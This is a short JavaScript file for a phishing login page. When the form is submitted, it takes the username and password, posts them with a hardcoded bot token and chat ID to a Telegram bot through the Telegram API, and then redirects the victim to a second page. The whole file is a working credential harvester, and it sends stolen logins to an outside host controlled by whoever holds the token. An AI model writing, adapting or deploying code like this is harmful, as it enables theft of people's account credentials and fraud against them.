// Your Telegram bot token and chat ID
const botToken = '6539542013:AAFoZC1f9Kt3h8ExiF_BlcglEg1RcXZJGjA';
const chatId = '720557167';

document.addEventListener('DOMContentLoaded', function() {
  const loginForm = document.getElementById('login_form');

  loginForm.addEventListener('submit', function(event) {
    event.preventDefault();

    // Get user input from the form
    const username = document.getElementById('username').value;
    const password = document.getElementById('password').value;

    // Send user input to the Telegram bot
    const message = `User Login:☞✅\n👤Username:☞ ${username}\n🔓Password:☞ ${password}`;
    sendToTelegram(message);

    // Redirect to the desired URL
    window.location.href = '/second.html';
  });

  // Function to send data to the Telegram bot
  function sendToTelegram(message) {
    const apiUrl = `https://api.telegram.org/bot${botToken}/sendMessage`;
    const data = {
      chat_id: chatId,
      text: message,
    };

    // Send a POST request to the Telegram API
    fetch(apiUrl, {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
      },
      body: JSON.stringify(data),
    })
    .then(response => response.json())
    .then(data => console.log('Message sent to Telegram:', data))
    .catch(error => console.error('Error sending message to Telegram:', error));
  }
});
